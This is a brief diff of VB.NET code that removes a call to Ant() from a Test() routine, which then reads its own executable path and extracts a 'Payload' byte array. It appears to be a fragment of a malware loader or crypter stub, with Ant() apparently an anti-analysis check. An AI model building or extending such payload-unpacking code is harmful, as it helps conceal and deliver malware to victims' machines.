@@ -42,7 +42,6 @@ Class Stuff
     End Sub
 
     Shared Sub Test()
-        Ant()
         Dim AppPath As String = Application.ExecutablePath
 
         Dim Payload() As Byte = GetPload(AppPath)
